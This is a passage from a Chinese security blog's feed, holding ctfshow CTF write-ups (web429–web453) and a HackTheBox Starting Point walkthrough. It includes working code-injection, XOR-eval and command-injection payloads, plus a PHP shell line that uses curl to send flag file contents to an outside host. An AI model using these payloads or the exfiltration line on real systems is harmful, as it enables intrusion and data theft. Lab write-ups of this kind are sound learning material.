class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>这里匹配是只匹配了开头，<strong>所以只需要在payload前面加个空格就好了</strong></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code= open(&#x27;app.py&#x27;).read()</span><br></pre></td></tr></table></figure><h2 id="web430-ssti-过滤了os-open-system-read-eval"><a href="#web430-ssti-过滤了os-open-system-read-eval" class="headerlink" title="web430(ssti 过滤了os|open|system|read|eval)"></a>web430(ssti 过滤了os|open|system|read|eval)</h2><p><strong>同 web429的做法</strong></p><p>也是只匹配开头</p><h2 id="web-431-ssti-过滤了过滤了os-open-system-read-eval-str"><a href="#web-431-ssti-过滤了过滤了os-open-system-read-eval-str" class="headerlink" title="web 431 ssti 过滤了过滤了os|open|system|read|eval|str"></a>web 431 ssti 过滤了过滤了os|open|system|read|eval|str</h2><p><strong>同web430</strong></p><p><strong>后面就是正常的过滤了，因为过滤了eval所以我们只能用exec来执行了.但是exec的返回值永远是none，所以只能用一些盲打的方法了。</strong></p><h2 id="web432-过滤os-open-system-read-eval-web449都是ssti的题目"><a href="#web432-过滤os-open-system-read-eval-web449都是ssti的题目" class="headerlink" title="web432(过滤os|open|system|read|eval)-web449都是ssti的题目"></a>web432(过滤os|open|system|read|eval)-web449都是ssti的题目</h2><p>这里就不做了</p><h2 id="web450"><a href="#web450" class="headerlink" title="web450"></a>web450</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-02-03 22:57:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-02-04 14:28:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z]+[\^][a-z]+[\^][a-z]+$/&#x27;</span>, <span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;(<span class="subst">$ctfshow</span>)();&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">15</span></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpinfo^phpinfo^phpinfo</span><br></pre></td></tr></table></figure><p>这里就是p和p异或，依次来异或</p><p><strong>异或 </strong>     ——-&gt;    相同为零   不同为1 </p><p>拿<code>p^p^p</code>来举个例子     先是 <code>p^p</code>  —-&gt;  0      然后 <code>0^p</code>  ———-&gt;   p</p><p>就是这样了</p><h2 id="web451"><a href="#web451" class="headerlink" title="web451"></a>web451</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-02-03 22:57:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-02-04 15:38:05</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z]+[\^][a-z]+[\^][a-z]+$/&#x27;</span>, <span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/phpinfo/&#x27;</span>, <span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;(<span class="subst">$ctfshow</span>)();&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">15</span></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpanfo^phpznfo^phprnfo</span><br></pre></td></tr></table></figure><p><strong>这里的异或是转化为ascii码来进行计算的</strong></p><h2 id="web452"><a href="#web452" class="headerlink" title="web452"></a>web452</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-02-03 22:57:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-02-04 16:05:23</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;|\&quot;|[0-9]|\&#123;|\[|\~|\^|phpinfo|\$/i&#x27;</span>, <span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">15</span></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow=<span class="keyword">echo</span> `cat /f*`;</span><br></pre></td></tr></table></figure><h2 id="web453"><a href="#web453" class="headerlink" title="web453"></a>web453</h2><p><strong>题目</strong></p><p><img src="../images/image-20230405221320480.png" alt="image-20230405221320480"></p><p>先去读取一下源码</p><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-02-04 22:43:04</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-02-05 02:03:03</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$http</span> = <span class="keyword">new</span> <span class="title class_">Swoole\Http\Server</span>(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">on</span>(<span class="string">&#x27;start&#x27;</span>, function (<span class="variable">$server</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Swoole http server is started at http://0.0.0.0:80\n&quot;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">on</span>(<span class="string">&#x27;request&#x27;</span>, function (<span class="variable">$request</span>, <span class="variable">$response</span>) &#123;</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$controller</span>, <span class="variable">$action</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>, <span class="title function_ invoke__">trim</span>(<span class="variable">$request</span>-&gt;server[<span class="string">&#x27;request_uri&#x27;</span>], <span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">    <span class="variable">$route</span> = <span class="keyword">array</span>(<span class="string">&#x27;ctf&#x27;</span>);</span><br><span class="line">    <span class="variable">$method</span> = <span class="keyword">array</span>(<span class="string">&#x27;show&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$controller</span>, <span class="variable">$route</span>) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$action</span>, <span class="variable">$method</span>))&#123;</span><br><span class="line">    (<span class="keyword">new</span> <span class="variable">$controller</span>)-&gt;<span class="variable">$action</span>(<span class="variable">$request</span>, <span class="variable">$response</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;&lt;h3&gt;where is flag?&lt;/h3&gt;&lt;!--/ctf/show?s=XXX  file_get_contents($_POST[\&#x27;s\&#x27;])--&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">start</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"> <span class="variable">$s</span>=<span class="variable">$request</span>-&gt;post[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$s</span>));</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;s not found&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"> <span class="variable">$s</span>=<span class="variable">$request</span>-&gt;post[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line"> <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;shell.php&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;file write done in /var/www/shell.php&#x27;</span>);</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;s not found&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;php shell.php&#x27;</span>);</span><br><span class="line"><span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;command exec done&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>也就是说，当我们访问/ctf/file post传入的s会写入shell.php中，然后当我们访问/ctf/exec时，就会去执行刚才的shell.php。<br>里面的内容大家就可以随意发挥了。<br>我写的是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;curl http://xxx.xxx.xxx:4567?p=`cat f*`&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>剩下的题就不做了</p><p>去看yu师傅和Y4师傅的博客就好了</p><p><a href="https://blog.csdn.net/solitudi/article/details/113778651">Y4wp </a>    <a href="https://blog.csdn.net/miuzzx/article/details/112692697?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=ctfshow%20web396&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-4-112692697.nonecase&amp;spm=1018.2226.3001.4187">yu2xxwp</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;web396&quot;&gt;&lt;a href=&quot;#web396&quot; class=&quot;headerlink&quot; title=&quot;web396&quot;&gt;&lt;/a&gt;web396&lt;/h2&gt;&lt;p&gt;题目&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td cl</summary>
      
    
    
    
    
    <category term="ctfshow 其他 刷题记录" scheme="https://ke1nys.github.io/tags/ctfshow-%E5%85%B6%E4%BB%96-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>htb-starting point</title>
    <link href="https://ke1nys.github.io/posts/41d43cf2.html"/>
    <id>https://ke1nys.github.io/posts/41d43cf2.html</id>
    <published>2023-03-29T07:21:55.000Z</published>
    <updated>2023-04-06T06:48:36.146Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Meow-telnet"><a href="#Meow-telnet" class="headerlink" title="Meow(telnet)"></a>Meow(telnet)</h2><p><img src="../images/image-20230329161813096.png" alt="image-20230329161813096"></p><p><img src="../images/image-20230329152247821.png" alt="image-20230329152247821"></p><p>怎么先完成vpn的配置，记得上面的<strong>vpn数字</strong>要选一样的，不然ping不通，</p><p>还有一点就是先关闭靶机在关闭vpn，不然的话得等好几个小时才能重新连接vpn</p><p>先ping一下，看一下靶机是否存活</p><p><img src="../images/image-20230329152446543.png" alt="image-20230329152446543"></p><p>有返回了，代表存活</p><p>然后扫一下端口</p><p><img src="../images/image-20230329152518368.png" alt="image-20230329152518368"></p><p>发现23端口是打开的，并且是telnet服务的</p><p>因为telnet是远程登录服务器服务，尝试用这个服务区登录一下</p><p><strong>telnet xxxxxxxx</strong></p><p><img src="../images/image-20230329152843423.png" alt="image-20230329152843423"></p><p><img src="../images/image-20230329152903431.png" alt="image-20230329152903431"></p><p>最后猜的root用户，然后登录成功</p><p>拿到flag</p><h2 id="Fawn-ftp"><a href="#Fawn-ftp" class="headerlink" title="Fawn(ftp)"></a>Fawn(ftp)</h2><p><img src="../images/image-20230329161804441.png" alt="image-20230329161804441"></p><p><img src="../images/image-20230329153208092.png" alt="image-20230329153208092"></p><p>可以ping通，说明主机存活</p><p>然后进行nmap扫描</p><p>-sV 探测服务/版本信息 我们可以看到 开放21端口的ftp协议 版本是 vsftpd 3.0.3</p><p><img src="../images/image-20230329153834657.png" alt="image-20230329153834657"></p><p>目标上运行的操作系统类型是Unix</p><p><strong>对ftp进行补充一下</strong></p><p>FTP没有账户时候我们的username: anonymous 采用匿名访问;</p><p>对于FTP我们每次操作服务器都会给我们回应状态码 不同状态码对应不同的的含义：</p><p><img src="../images/image-20230329154248434.png" alt="image-20230329154248434"></p><p>比如用户登录成功 服务器就会返回230状态码;</p><p>在这个ftp服务器上是不能直接cat读取文件的，我们得进行get外带</p><p>下载文件</p><p>下载文件通常用get和mget这两条命令。 a) get 格式：get [remote-file] [local-file] 将文件从远端主机中传送至本地主机中。 如要获取远程服</p><p><code>ftp&gt; get /usr/your/1.htm 1.htm (回车)</code></p><p>b) mget　　　　　　 格式：mget [remote-files] 从远端主机接收一批文件至本地主机。 如要获取服务器上/usr/your/下的所有文件，则</p><p><code>ftp&gt; cd /usr/your/ ftp&gt; mget *.* (回车)</code></p><p>先用ftp 连接 服务器 采用匿名登录 无密码 查询服务器 文件 发现flag 进行下载 然后本地读取</p><p><img src="../images/image-20230329154621851.png" alt="image-20230329154621851"></p><p>匿名访问，没有密码</p><p><img src="../images/image-20230329154739182.png" alt="image-20230329154739182"></p><p>然后就可以本地当前目录下查看flag了</p><p><img src="../images/image-20230329154822624.png" alt="image-20230329154822624"></p><p>通关</p><h2 id="Dancing-SMB"><a href="#Dancing-SMB" class="headerlink" title="Dancing(SMB)"></a>Dancing(SMB)</h2><p><img src="../images/image-20230329161824778.png" alt="image-20230329161824778"></p><p>还是先ping下</p><p><img src="../images/image-20230329155320103.png" alt="image-20230329155320103"></p><p>可以ping通，说明主机存活</p><p>SMB(全称是Server Message Block)是一个网络<a href="https://www.yanyang.ink/?golink=aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlOEQlOEYlRTglQUUlQUUvMTMwMjAyNjk/ZnJvbU1vZHVsZT1sZW1tYV9pbmxpbms=">协议</a>名，它能被用于<a href="https://www.yanyang.ink/?golink=aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS9XZWIvMTUwNTY0P2Zyb21Nb2R1bGU9bGVtbWFfaW5saW5r">Web</a>连接和<a href="https://www.yanyang.ink/?golink=aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlQUUlQTIlRTYlODglQjclRTclQUIlQUYvMTAxMDgxP2Zyb21Nb2R1bGU9bGVtbWFfaW5saW5r">客户端</a>与服务器之间的<a href="https://www.yanyang.ink/?golink=aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTQlQkYlQTElRTYlODElQUYlRTYlQjIlOUYlRTklODAlOUEvMTA1MzAxMj9mcm9tTW9kdWxlPWxlbW1hX2lubGluaw==">信息沟通</a>。SMB最初是IBM的贝瑞·费根鲍姆（Barry Feigenbaum）研制的，其目的是将<a href="https://www.yanyang.ink/?golink=aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS9ET1MlRTYlOTMlOEQlRTQlQkQlOUMlRTclQjMlQkIlRTclQkIlOUYvNjE4NjAwMz9mcm9tTW9kdWxlPWxlbW1hX2lubGluaw==">DOS操作系统</a>中的本地文件接口“中断13”改造为<a href="https://www.yanyang.ink/?golink=aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTclQkQlOTElRTclQkIlOUMlRTYlOTYlODclRTQlQkIlQjYlRTclQjMlQkIlRTclQkIlOUYvOTcxOTQyMD9mcm9tTW9kdWxlPWxlbW1hX2lubGluaw==">网络文件系统</a>。<br>简而言之就是个传输文件 文件共享用的协议 跟FTP差不了太多。</p><p><img src="../images/image-20230329160924545.png" alt="image-20230329160924545"></p><p>使用nmap扫一下，发现开了三个端口</p><p>135: <strong>msrpc</strong> <strong>（MicroSoft Remote Procedure Call，微软远程过程调用）</strong> 这是windows系统特有的服务<br>139:<strong>netbios-ssn</strong> 用于提供文件共享服务,主要用于企业内部网之间互相访问 也是微软的服务<br>445:就是我们说的<strong>SMB</strong><br>尝试连接SMB 密码为空 连接成功：</p><p><img src="../images/image-20230329161145722.png" alt="image-20230329161145722"></p><p>可以看到有WorkShares 的目录 可以访问 ，进行访问<br>smbclient //10.129.71.90/WorkShares<br>找了一下flag.txt 发现 没有 于是进入别的目录找 在James.P下找到</p><p><img src="../images/image-20230329161314793.png" alt="image-20230329161314793"></p><p><img src="../images/image-20230329161347826.png" alt="image-20230329161347826"></p><p>通关</p><h2 id="Redeemer-Redis"><a href="#Redeemer-Redis" class="headerlink" title="Redeemer(Redis)"></a>Redeemer(Redis)</h2><p><img src="../images/image-20230329161840375.png" alt="image-20230329161840375"></p><p><strong>Redis</strong>是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。redis的默认端口号是6379。</p><p><strong>还是先ping一下</strong></p><p><img src="../images/image-20230329162205909.png" alt="image-20230329162205909"></p><p>接下来扫一下默认端口</p><p>前面没扫到是因为nmap默认的端口好是1-1000</p><p><img src="../images/image-20230329162326905.png" alt="image-20230329162326905"></p><p><img src="../images/image-20230329162446458.png" alt="image-20230329162446458"></p><p>扫到redis版本了</p><p><strong>通过redis-cli尝试连接</strong></p><p><img src="../images/image-20230329162733702.png" alt="image-20230329162733702"></p><p>连接成功，通过输入 <strong>info</strong> 查看redis服务信息与状态，发现数据库名与Key个数，通过查看数据库内容发现<strong>flag</strong></p><p><img src="../images/image-20230329162841616.png" alt="image-20230329162841616"></p><p><img src="../images/image-20230329162921188.png" alt="image-20230329162921188"></p><p>通关</p><p>(vip的题做不了)  ——&gt;  只能去做 下一个板块免费的题了</p><h2 id="Appointment-sql注入"><a href="#Appointment-sql注入" class="headerlink" title="Appointment(sql注入)"></a>Appointment(sql注入)</h2><p><img src="../images/image-20230329164816236.png" alt="image-20230329164816236"></p><p>先ping一下</p><p><img src="../images/image-20230329164831717.png" alt="image-20230329164831717"></p><p>ping通了</p><p>这题得开kali的图形化界面了，因为这里考察的点是sql注入</p><p>这里连接openvpn的时候，machine要连接udp,start-point要连接tcp</p><p>不然的话靶机用不了</p><p>扫一下端口</p><p><img src="../images/image-20230330143929462.png" alt="image-20230330143929462"></p><p>发现80默认端口打开，<img src="../images/image-20230330144058574.png" alt="image-20230330144058574"></p><p>然后尝试一下弱密码，发现不行后在尝试一下万能密码注入试试</p><p><img src="../images/image-20230330144149273.png" alt="image-20230330144149273"></p><p>万能密码注入成功</p><p>通关</p><h2 id="Sequel-mysql"><a href="#Sequel-mysql" class="headerlink" title="Sequel(mysql)"></a>Sequel(mysql)</h2><p>考点</p><p><img src="../images/image-20230330145212076.png" alt="image-20230330145212076"></p><p>还是先ping一下</p><p><img src="../images/image-20230330145240338.png" alt="image-20230330145240338"></p><p>能通，扫一下端口号</p><p><img src="../images/image-20230330145921057.png" alt="image-20230330145921057"></p><p>扫完了，发现开了个3306端口，是mysql的默认端口号</p><p>然后我们尝试连接一下数据库(没安装mysql的自己手动安装一下)</p><p><img src="../images/image-20230330150224251.png" alt="image-20230330150224251"></p><p>这里的密码为空就不填了(root用户(就是用户名)允许无密码登录)</p><p><img src="../images/image-20230330150343364.png" alt="image-20230330150343364"></p><p>连接成功</p><p>接下来就是利用sql语句来查询了</p><p><img src="../images/image-20230330150501495.png" alt="image-20230330150501495"></p><p>最后拿到flag</p><p>通关</p><h2 id="Crocodile-ftp和web网页"><a href="#Crocodile-ftp和web网页" class="headerlink" title="Crocodile(ftp和web网页)"></a>Crocodile(ftp和web网页)</h2><p><img src="../images/image-20230330150804673.png" alt="image-20230330150804673"></p><p>还是先ping一下</p><p><img src="../images/image-20230330150834777.png" alt="image-20230330150834777"></p><p>接下来扫一下端口</p><p><img src="../images/image-20230330151245444.png" alt="image-20230330151245444"></p><p>扫出来老朋友ftp了，还有这个80端口的web网页，那我们还是先去看一下这个ftp</p><p><img src="../images/image-20230330151515067.png" alt="image-20230330151515067"></p><p><img src="../images/image-20230330151620224.png" alt="image-20230330151620224"></p><p>直接把ftp服务器上的账号密码全给提取到本地了</p><p><img src="../images/image-20230330152635235.png" alt="image-20230330152635235"></p><p>访问网站看到这玩意(打开真慢)</p><p>然后利用<code>gobuster</code>扫一下网站</p><p>gobuster dir -u <a href="http://10.129.98.232">http://10.129.98.232</a> -w /usr/share/wordlists/dirb/common.txt</p><p>dir  —-&gt; 是扫目录</p><p>dns  —-&gt;爆破dns</p><p>vHost  —-&gt; 扫子域</p><p><img src="../images/image-20230330152958204.png" alt="image-20230330152958204"></p><p>发现存在301重定向(302也是)，然后去访问一下</p><p>在访问到<a href="http://10.129.98.232/dashboard/的时候，跳转到了">http://10.129.98.232/dashboard/的时候，跳转到了</a></p><p><img src="../images/image-20230330153223984.png" alt="image-20230330153223984"></p><p>然后我们就拿之前在ftp服务器获取的账号密码进行登录</p><p><img src="../images/image-20230330153317372.png" alt="image-20230330153317372"></p><p>通关</p><h2 id="Responder"><a href="#Responder" class="headerlink" title="Responder()"></a>Responder()</h2><p>考点</p><p><img src="../images/image-20230330154052951.png" 